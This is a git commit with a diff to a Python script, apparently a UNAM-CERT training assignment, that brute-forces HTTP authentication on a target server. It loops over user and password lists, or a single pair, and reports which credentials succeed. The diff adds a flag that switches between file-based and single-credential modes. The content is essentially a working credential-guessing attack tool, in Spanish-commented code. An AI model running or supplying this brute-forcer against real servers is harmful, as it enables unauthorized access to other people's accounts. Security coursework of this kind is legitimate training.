e52b349c7f6bf73e335ad95c95f0614aa88c5e69
richard-ohg <ricardoomar.angel@gmail.com>
2018-12-03 14:40:52 -0600

    Bandera para indicar si son varios usuarios o solo uno. Tarea 5 terminada

--- tarea5.py
+++ tarea5.py
@@ -3,7 +3,11 @@
 #UNAM-CERT
 
 #Para ejecutar
-#python req.py -s servidor -U archivo_usuarios -P archivo_password -r archivo_reporte -v (-v para modo verboso) 
+# Archivo de usuarios y archivo de contraseñas
+#python req.py -s servidor -f -U archivo_usuarios -P archivo_password -r archivo_reporte -v (-v para modo verboso) 
+# Un usuario y una contraseña:
+#python req.py -s servidor -U usuario -P contraseña -r archivo_reporte -v (-v para modo verboso) 
+
 import sys
 import optparse
 from requests import get
@@ -19,17 +23,19 @@ def addOptions():
     parser = optparse.OptionParser()
     parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
     parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
-    parser.add_option('-U', '--user', dest='arch_user', default=None, help='User that will be tested during the attack.')
-    parser.add_option('-P', '--password', dest='arch_pass', default=None, help='Password that will be tested during the attack.')
+    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
+    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
     parser.add_option('-v', '--verbose',action='store_true', dest='verbose', default=False, help='Mode verbose')
-    parser.add_option('-r', '--report', dest='report', default=None, help='Mode verbose')
+    parser.add_option('-r', '--report', dest='report', default=None, help='Bandera para indicar el archivo donde se imprimirán los resultados')
+    parser.add_option('-f', '--file',action='store_true', dest='file', default=False, help='Bandera para indicar si los usuarios y contraseñas están en un archivo ')
+    # parser.add_option('-o', '--one',action='store_true', dest='one', default=False, help='Bandera para indicar si solo se quiere un usuario y una contraseña')
     opts,args = parser.parse_args()
     return opts
     
 def checkOptions(options):
     if options.server is None:
         printError('Debes especificar un servidor a atacar.', True)
-
+# 
 
 def reportResults(archivo,resultados):
     with open(archivo,"w") as file:
@@ -64,22 +70,37 @@ if __name__ == '__main__':
         opts = addOptions()
         checkOptions(opts)
         url = buildURL(opts.server, port = opts.port)
-        with open(opts.arch_pass) as passwords, open(opts.arch_user) as users:
-            for us in users:
-                passwords.seek(0)
-                for pas in passwords:
-                    if opts.verbose:
-                        print("Intentando usuario: "+us[:-1]+" contraseña: "+pas[:-1])
-                        if makeRequest(url, us[:-1], pas[:-1]):
-                            resultados.append((us[:-1], pas[:-1],"Funciono"))
+        if opts.file:
+            with open(opts.password) as passwords, open(opts.user) as users:
+                for us in users:
+                    passwords.seek(0)
+                    for pas in passwords:
+                        if opts.verbose:
+                            print("Intentando usuario: "+us[:-1]+" contraseña: "+pas[:-1])
+                            if makeRequest(url, us[:-1], pas[:-1]):
+                                resultados.append((us[:-1], pas[:-1],"Funciono"))
+                            else:
+                                resultados.append((us[:-1], pas[:-1],"No funciono"))
                         else:
-                            resultados.append((us[:-1], pas[:-1],"No funciono"))
-                    else:
-                        if makeRequest(url, us[:-1], pas[:-1]):
-                            resultados.append((us[:-1], pas[:-1],"Funciono"))
-                        else:
-                            resultados.append((us[:-1], pas[:-1],"No funcionó"))
-        reportResults(opts.report, resultados)
+                            if makeRequest(url, us[:-1], pas[:-1]):
+                                resultados.append((us[:-1], pas[:-1],"Funciono"))
+                            else:
+                                resultados.append((us[:-1], pas[:-1],"No funciono"))
+            reportResults(opts.report, resultados)
+        else:
+            if opts.verbose:
+                print("Intentando usuario: "+opts.user+" contraseña: "+opts.password)
+                if makeRequest(url, opts.user, opts.password):
+                    resultados.append((opts.user, opts.password,"Funciono"))
+                else:
+                    resultados.append((opts.user, opts.password,"No funciono")) 
+            else:
+                if makeRequest(url, opts.user, opts.password):
+                    resultados.append((opts.user, opts.password,"Funciono"))
+                else:
+                    resultados.append((opts.user, opts.password,"No funciono"))
+            reportResults(opts.report, resultados)
+
     except Exception as e:
         printError('Ocurrio un error inesperado')
         printError(e, True)
